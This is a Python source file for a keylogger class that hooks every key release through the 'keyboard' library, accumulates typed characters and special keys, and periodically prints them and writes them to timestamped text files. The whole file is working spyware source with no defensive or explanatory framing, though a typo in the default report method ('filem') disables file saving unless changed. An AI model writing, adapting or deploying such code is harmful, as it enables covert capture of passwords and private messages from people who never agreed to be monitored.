import keyboard
from threading import Timer
from datetime import datetime


class Keylogger:

    def __init__(self, interval, report_method="filem"):
        # time in seconds
        self.interval = interval
        self.report_method = report_method
        # contains keystrokes within 'self.interval'
        self.log = ""
        # record start & end datetime
        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def callback(self, event):
        """ Invoked when key up """
        name = event.name
        print("in callback ", name)
        if len(name) > 1:
            # not a character nor special key
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # add the key name to global 'self.log' variable
        self.log += name

    def update_filename(self):
        # name file by start & end datetime
        start_date_str = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_date_str}_{end_date_str}"

    def report_to_file(self):
        """ Creates a log file in the current directory that contains keylogs """
        # open the file in write mode
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file, same as 'f.writelines(self.log)'
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
        Gets called every 'self.interval'
        Sends keylogs and resets 'self.log' variable
        """
        if self.log:
            self.end_date = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_date = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_date = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()
